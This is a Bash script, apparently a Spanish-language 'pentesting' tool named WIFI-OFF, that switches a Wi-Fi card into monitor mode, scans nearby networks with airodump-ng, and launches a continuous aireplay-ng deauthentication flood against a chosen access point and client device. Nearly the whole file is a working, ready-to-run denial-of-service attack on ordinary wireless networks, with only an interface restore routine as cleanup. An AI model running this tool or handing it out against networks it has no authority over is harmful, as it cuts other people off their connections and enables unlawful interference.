#!/bin/bash
#al precionar Ctrl + c le va a salir la opcion de poner "s" o "n", al poner "s" el script avanza, al poner "n" o cualquier otra letra el script retrocede.

echo """
   ██╗       ██╗██╗███████╗██╗       █████╗ ███████╗███████╗
   ██║  ██╗  ██║██║██╔════╝██║      ██╔══██╗██╔════╝██╔════╝
   ╚██╗████╗██╔╝██║█████╗  ██║█████╗██║  ██║█████╗  █████╗
    ████╔═████║ ██║██╔══╝  ██║╚════╝██║  ██║██╔══╝  ██╔══╝
    ╚██╔╝ ╚██╔╝ ██║██║     ██║      ╚█████╔╝██║     ██║
     ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝       ╚════╝ ╚═╝     ╚═╝     Autor::elchaka0
   ::v1.3::Pentesting_Tool::2024::Attack_DoS::Linux
   ╔══════════════════════════════════════════════════════════════════════╗
   ║         SCRIPT DE ESCANEO Y DESAUTENTICACIÓN DE REDES WI-FI          ║
   ╠══════════════════════════════════════════════════════════════════════╣
   ║    Esta herramienta escanea redes Wi-Fi del entorno utilizando la    ║
   ║ herramienta airodump-ng. Permite seleccionar una red especifica para ║
   ║     realizar un escaneo mas detallado y desauntenticar cualquier     ║
   ║                        dispositivo de la red                         ║
   ╚══════════════════════════════════════════════════════════════════════╝
"""

# Variables globales
interfaz_wifi=""
canal=""
bssid=""

# Función para mostrar la ayuda
function mostrar_ayuda {
    echo """
   ╔════════════════╦════════════════════════════════════════════════════════════════════════╗
   ║    COMANDOS    ║                              DESCRIPCION                               ║
   ╠════════════════╩════════════════════════════════════════════════════════════════════════╣
   ║ run            : Ejecuta el escaneo de redes Wi-Fi.                                     ║
   ║ --help         : Muestra esta pantalla de ayuda.                                        ║
   ║ Ctrl + c       : Para el script y da la opcion de regresar o seguir a la siguiente etapa║
   ╚═════════════════════════════════════════════════════════════════════════════════════════╝
    """
}

# Función para detectar la interfaz de red Wi-Fi
function detectar_interfaz_wifi() {
    interfaz_wifi=$(iw dev | awk '$1=="Interface"{print $2}' | head -n 1)
    if [ -z "$interfaz_wifi" ]; then
        echo "No se pudo detectar ninguna interfaz Wi-Fi. Asegúrate de tener una interfaz Wi-Fi activa."
        exit 1
    else
        echo "Interfaz Wi-Fi detectada: $interfaz_wifi"
    fi
}

# Función para restaurar la configuración de red
function restore_network {
    echo "Iniciando restauración de la configuración de red..."
    sudo ip link set "$interfaz_wifi" down
    sudo iw dev "$interfaz_wifi" set type managed
    sudo ip link set "$interfaz_wifi" up
    echo "Reiniciando NetworkManager..."
    sudo systemctl start NetworkManager
    echo "Reiniciando wpa_supplicant..."
    sudo systemctl start wpa_supplicant
    echo "Configuración restaurada."
}

# Función para manejar la desautenticación
function desautenticacion {
    read -p "Ingrese el BSSID del dispositivo (por ejemplo, 60:32:B1:15:19:58): " bssid
    read -p "Ingrese la STATION del dispositivo (por ejemplo, 04:b9:e3:2a:d2:da): " station
    echo "Ejecutando comando: sudo aireplay-ng -0 0 -a $bssid -c $station $interfaz_wifi"
    sudo aireplay-ng -0 0 -a "$bssid" -c "$station" "$interfaz_wifi"
}

# Función para manejar el escaneo de una red específica
function escanear_red_especifica {
    read -p "Ingrese el canal (por ejemplo, 2): " canal
    read -p "Ingrese el BSSID (por ejemplo, 30:32:A1:75:29:53): " bssid

    while true; do
        echo "Ejecutando comando: sudo airodump-ng --band a -c $canal --bssid $bssid $interfaz_wifi"
        sudo airodump-ng --band a -c "$canal" --bssid "$bssid" "$interfaz_wifi"

        read -p "¿Apagar wifi en un dispositivo? (s/n): " apagar_wifi
        if [[ "$apagar_wifi" == "s" ]]; then
            trap 'echo "Interrupción detectada. Volviendo al escaneo de la red específica..."; continue' SIGINT
            desautenticacion
        else
            break
        fi
    done
}

# Capturar la señal de interrupción (Ctrl+C)
trap 'echo "Interrupción detectada. Restaurando configuración..."; restore_network; exit' SIGINT

# Función principal
function main() {
    detectar_interfaz_wifi

    # Detener NetworkManager
    echo "Deteniendo NetworkManager..."
    sudo systemctl stop NetworkManager

    # Detener wpa_supplicant si está activo
    echo "Deteniendo wpa_supplicant..."
    sudo systemctl stop wpa_supplicant

    # Asegúrate de que no haya procesos usando el adaptador
    echo "Verificando procesos usando el adaptador Wi-Fi..."
    while pgrep -x "airodump-ng" > /dev/null; do
        echo "Esperando a que airodump-ng termine..."
        sleep 5
    done

    # Poner la interfaz Wi-Fi en modo monitor
    echo "Configurando la interfaz Wi-Fi en modo monitor, espere 10 segundos..."
    sudo ip link set "$interfaz_wifi" down
    sleep 10  # Esperar un momento más largo para asegurarse de que la interfaz esté completamente apagada
    sudo iw dev "$interfaz_wifi" set type monitor
    sudo ip link set "$interfaz_wifi" up

    while true; do
        # Escanear redes Wi-Fi
        echo "Escaneando redes Wi-Fi... (presiona Ctrl+C para detener)"
        sudo airodump-ng "$interfaz_wifi"

        # Solicitar opción para ejecutar un comando adicional
        read -p "¿Buscar una red wifi en especifico? (s/n): " ejecutar_comando
        if [[ "$ejecutar_comando" == "s" ]]; then
            trap 'echo "Interrupción detectada. Restaurando configuración..."; restore_network; exit' SIGINT
            escanear_red_especifica
        else
            break
        fi
    done

    # Restaurar la configuración de red (en caso de que el script termine normalmente)
    echo "Restaurando configuración al finalizar..."
    restore_network
}

# Menú inicial
function menu_inicial() {
    while true; do
        read -p "Ingrese un comando (run/--help): " comando
        case $comando in
            run)
                main
                ;;
            --help)
                mostrar_ayuda
                ;;
            *)
                echo "Comando no reconocido. Usa 'run' para iniciar o '--help' para obtener ayuda."
                ;;
        esac
    done
}

# Iniciar el menú inicial
menu_inicial
